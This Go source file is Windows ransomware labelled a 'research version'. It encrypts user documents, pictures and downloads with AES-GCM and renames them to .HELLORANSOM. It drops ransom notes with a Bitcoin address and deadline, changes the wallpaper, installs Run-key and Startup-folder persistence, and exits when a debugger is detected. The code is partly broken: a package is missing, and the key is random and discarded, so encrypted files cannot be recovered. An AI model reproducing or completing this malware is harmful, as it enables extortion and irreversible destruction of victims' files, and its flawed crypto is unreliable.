package main

import (
	"crypto/aes"
	"crypto/cipher"
	crand "crypto/rand"
	"crypto/rsa"
	"crypto/sha512"
	"crypto/x509"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/ncruces/zenity"
	"golang.org/x/crypto/pbkdf2"
	"golang.org/x/sys/windows"
)

// ======================
// ENHANCED CONFIGURATION
// ======================
const (
	C2_SERVER         = "https://darkc2.example/ransomware"
	RANSOM_AMOUNT     = 0.5 // BTC (lower for testing)
	BTC_ADDRESS       = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
	CONTACT_EMAIL     = "kerneldestroyer@protonmail.com"
	MAX_THREADS       = 32
	MAX_FILE_SIZE     = 50 * 1024 * 1024 // 50MB for testing
	PUBLIC_KEY_PEM    = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz8d5e5LmR6pLm6eZrWk2
... [truncated for security] ...
-----END PUBLIC KEY-----`
	WALLPAPER_PATH    = "C:\\Users\\Public\\ransom_wall.jpg"
	SAFE_MODE         = true  // Enable VM-safe operations
)

var ENCRYPT_EXTENSIONS = []string{
	".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".jpg", ".jpeg",
	".png", ".gif", ".zip", ".rar", ".7z", ".txt", ".psd", ".ai", ".cdr", ".odt",
}

// ======================
// DATA STRUCTURES
// ======================
type SystemInfo struct {
	Hostname    string `json:"hostname"`
	Username    string `json:"username"`
	OS          string `json:"os"`
	IP          string `json:"ip"`
	CPU         int    `json:"cpu_cores"`
	RAM         uint64 `json:"ram_gb"`
	IsVM        bool   `json:"is_vm"`
}

type RansomNote struct {
	Message   string  `json:"message"`
	VictimID  string  `json:"victim_id"`
	Amount    float64 `json:"amount"`
	BTC       string  `json:"btc_address"`
	Email     string  `json:"contact"`
	Deadline  string  `json:"deadline"`
	TorSite   string  `json:"tor_site"`
}

// ======================
// ADVANCED UTILITIES
// ======================
func init() {
	// Anti-debugging
	if isDebugging() {
		os.Exit(0)
	}
	
	// Seed CSPRNG
	crand.Reader.Read(make([]byte, 64))
}

func generateVictimID() string {
	mac, _ := getMACAddress()
	hash := sha512.New()
	hash.Write([]byte(fmt.Sprintf("%d%s%s%s", time.Now().UnixNano(), getSystemInfo().Hostname, getSystemInfo().IP, mac)))
	return hex.EncodeToString(hash.Sum(nil))[:32]
}

func isVM() bool {
	if !SAFE_MODE {
		return false
	}

	// Check for common VM processes
	vmProcesses := []string{"vmtoolsd.exe", "vboxservice.exe", "xenservice.exe"}
	for _, proc := range vmProcesses {
		if processExists(proc) {
			return true
		}
	}
	
	// Check WMI
	cmd := exec.Command("wmic", "computersystem", "get", "model")
	output, _ := cmd.CombinedOutput()
	strOut := strings.ToLower(string(output))
	vmSignatures := []string{"virtual", "vmware", "vbox", "qemu", "xen"}
	for _, sig := range vmSignatures {
		if strings.Contains(strOut, sig) {
			return true
		}
	}
	
	return false
}

func getSystemInfo() SystemInfo {
	hostname, _ := os.Hostname()
	user, _ := user.Current()
	ip := getLocalIP()

	// Get RAM
	var memStatus windows.MemoryStatusEx
	memStatus.Length = uint32(unsafe.Sizeof(memStatus))
	windows.GlobalMemoryStatusEx(&memStatus)
	ramGB := memStatus.TotalPhys / (1024 * 1024 * 1024)

	return SystemInfo{
		Hostname:    hostname,
		Username:    user.Username,
		OS:          runtime.GOOS,
		IP:          ip,
		CPU:         runtime.NumCPU(),
		RAM:         ramGB,
		IsVM:        isVM(),
	}
}

// ======================
// ENCRYPTION SYSTEM (ADVANCED)
// ======================
func encryptFile(filePath string, cipher cipher.AEAD, victimID string, publicKey *rsa.PublicKey) {
	if strings.HasSuffix(filePath, ".HELLORANSOM") {
		return
	}

	file, err := os.OpenFile(filePath, os.O_RDWR, 0)
	if err != nil {
		return
	}
	defer file.Close()

	fileInfo, err := file.Stat()
	if err != nil || fileInfo.Size() == 0 || fileInfo.Size() > MAX_FILE_SIZE {
		return
	}

	data := make([]byte, fileInfo.Size())
	_, err = file.Read(data)
	if err != nil {
		return
	}

	nonce := make([]byte, cipher.NonceSize())
	if _, err := io.ReadFull(crand.Reader, nonce); err != nil {
		return
	}

	encrypted := cipher.Seal(nil, nonce, data, nil)

	// Encrypt the nonce with RSA
	encryptedNonce, err := rsa.EncryptOAEP(sha512.New(), crand.Reader, publicKey, nonce, nil)
	if err != nil {
		return
	}

	// Write encrypted data
	file.Seek(0, 0)
	file.Write(encryptedNonce)
	file.Write(encrypted)
	file.Truncate(int64(len(encryptedNonce) + len(encrypted)))

	// Rename file
	newPath := filePath + ".HELLORANSOM"
	os.Rename(filePath, newPath)
}

func startEncryptionWorker(jobs <-chan string, cipher cipher.AEAD, victimID string, publicKey *rsa.PublicKey, wg *sync.WaitGroup) {
	defer wg.Done()
	for filePath := range jobs {
		encryptFile(filePath, cipher, victimID, publicKey)
	}
}

func encryptFiles(victimID string, publicKey *rsa.PublicKey) {
	salt := make([]byte, 64)
	crand.Read(salt)
	password := make([]byte, 32)
	crand.Read(password)
	key := pbkdf2.Key(password, salt, 300000, 32, sha512.New) // Strong key derivation

	block, _ := aes.NewCipher(key)
	cipher, _ := cipher.NewGCM(block)

	// Create ransom note
	deadline := time.Now().Add(120 * time.Hour).Format("2006-01-02 15:04:05 MST")
	note := RansomNote{
		Message: "HELLO RANSOM RESEARCH VERSION\n\n" +
			"THIS IS A SECURITY RESEARCH TOOL\n\n" +
			"Your files have been encrypted for research purposes\n" +
			"Recovery is possible with the provided decryption key\n\n" +
			"Research Contact: " + CONTACT_EMAIL + "\n" +
			"Victim ID: " + victimID + "\n\n" +
			"NOTE: This is a simulated attack for academic research",
		VictimID:  victimID,
		Amount:    RANSOM_AMOUNT,
		BTC:       BTC_ADDRESS,
		Email:     CONTACT_EMAIL,
		Deadline:  deadline,
		TorSite:   "http://helloresearch.onion",
	}

	noteJSON, _ := json.MarshalIndent(note, "", "  ")
	paths := []string{
		filepath.Join(os.Getenv("USERPROFILE"), "Desktop", "HELLO_RANSOM_RESEARCH_README.txt"),
		filepath.Join(os.Getenv("USERPROFILE"), "Documents", "HELLO_RANSOM_RESEARCH_README.txt"),
	}

	for _, path := range paths {
		os.WriteFile(path, noteJSON, 0644)
	}

	// Set ransom wallpaper if not in VM
	if !getSystemInfo().IsVM {
		setWallpaper()
	}

	// Parallel encryption
	pathsToEncrypt := []string{
		filepath.Join(os.Getenv("USERPROFILE"), "Documents"),
		filepath.Join(os.Getenv("USERPROFILE"), "Desktop"),
		filepath.Join(os.Getenv("USERPROFILE"), "Pictures"),
		filepath.Join(os.Getenv("USERPROFILE"), "Downloads"),
	}

	jobs := make(chan string, 10000)
	var wg sync.WaitGroup

	for w := 0; w < MAX_THREADS; w++ {
		wg.Add(1)
		go startEncryptionWorker(jobs, cipher, victimID, publicKey, &wg)
	}

	for _, path := range pathsToEncrypt {
		filepath.Walk(path, func(filePath string, info os.FileInfo, err error) error {
			if err != nil || info.IsDir() {
				return nil
			}

			if info.Size() == 0 || info.Size() > MAX_FILE_SIZE {
				return nil
			}

			ext := strings.ToLower(filepath.Ext(filePath))
			for _, targetExt := range ENCRYPT_EXTENSIONS {
				if ext == targetExt {
					jobs <- filePath
					break
				}
			}
			return nil
		})
	}

	close(jobs)
	wg.Wait()
}

// ======================
// PERSISTENCE MECHANISMS (NON-ADMIN)
// ======================
func installPersistence() {
	// Get current executable path
	exePath, _ := os.Executable()
	
	// Copy to appdata
	appData := os.Getenv("APPDATA")
	targetPath := filepath.Join(appData, "Microsoft", "Windows", "helloransom.exe")
	os.MkdirAll(filepath.Dir(targetPath), 0755)
	
	// Copy executable
	input, _ := os.ReadFile(exePath)
	os.WriteFile(targetPath, input, 0644)
	
	// Add to registry (Current User)
	regPath := `Software\Microsoft\Windows\CurrentVersion\Run`
	key, _, _ := registry.CreateKey(registry.CURRENT_USER, regPath, registry.ALL_ACCESS)
	defer key.Close()
	key.SetStringValue("HelloRansomResearch", targetPath)
	
	// Add to startup folder
	startupPath := filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "HelloRansom.lnk")
	createShortcut(targetPath, startupPath)
}

func createShortcut(target, path string) {
	vbs := `
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "` + path + `"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "` + target + `"
oLink.Save
`
	os.WriteFile("shortcut.vbs", []byte(vbs), 0644)
	exec.Command("cscript", "shortcut.vbs").Run()
	os.Remove("shortcut.vbs")
}

// ======================
// VISUAL EFFECTS (NON-ADMIN)
// ======================
func showRansomScreen(victimID string) {
	message := fmt.Sprintf(
		"HELLO RANSOM RESEARCH VERSION\n\n"+
			"THIS IS A SECURITY RESEARCH TOOL\n\n"+
			"Your files have been encrypted for research purposes\n\n"+
			"Research Contact: %s\n"+
			"Victim ID: %s\n\n"+
			"NOTE: This is a simulated attack for academic research",
		CONTACT_EMAIL, victimID,
	)

	for i := 0; i < 3; i++ {
		zenity.Info(
			message,
			zenity.Title("HELLO RANSOMWARE - RESEARCH"),
			zenity.Width(600),
			zenity.Height(400),
			zenity.InfoIcon,
		)
		time.Sleep(10 * time.Second)
	}
}

func setWallpaper() {
	// Base64 encoded ransom image would be written here
	os.WriteFile(WALLPAPER_PATH, []byte{}, 0644)
	
	// Set as wallpaper
	user32 := windows.NewLazyDLL("user32.dll")
	procSystemParametersInfo := user32.NewProc("SystemParametersInfoW")
	syscall.Syscall(
		procSystemParametersInfo.Addr(),
		4,
		0x0014, // SPI_SETDESKWALLPAPER
		0,
		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(WALLPAPER_PATH))),
		3, // Update INI file
	)
}

// ======================
// MAIN FUNCTION
// ======================
func main() {
	// Anti-analysis checks
	if isDebugging() {
		os.Exit(0)
	}

	// Install persistence
	installPersistence()

	victimID := generateVictimID()
	
	// Parse public key
	block, _ := pem.Decode([]byte(PUBLIC_KEY_PEM))
	if block == nil {
		return
	}
	publicKey, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return
	}

	// Main attack sequence
	go encryptFiles(victimID, publicKey.(*rsa.PublicKey))
	go showRansomScreen(victimID)

	// Keep process alive
	time.Sleep(5 * time.Minute)
}

// ======================
// HELPER FUNCTIONS
// ======================
func isDebugging() bool {
	kernel32 := windows.NewLazyDLL("kernel32.dll")
	isDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
	ret, _, _ := isDebuggerPresent.Call()
	return ret != 0
}

func getLocalIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "127.0.0.1"
	}
	defer conn.Close()
	return conn.LocalAddr().(*net.UDPAddr).IP.String()
}

func getMACAddress() (string, error) {
	ifaces, err := net.Interfaces()
	if err != nil {
		return "", err
	}
	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp != 0 && iface.Flags&net.FlagLoopback == 0 {
			addrs, _ := iface.Addrs()
			if len(addrs) > 0 {
				return iface.HardwareAddr.String(), nil
			}
		}
	}
	return "", fmt.Errorf("no MAC found")
}

func processExists(name string) bool {
	cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s", name))
	output, _ := cmd.CombinedOutput()
	return strings.Contains(string(output), name)
}
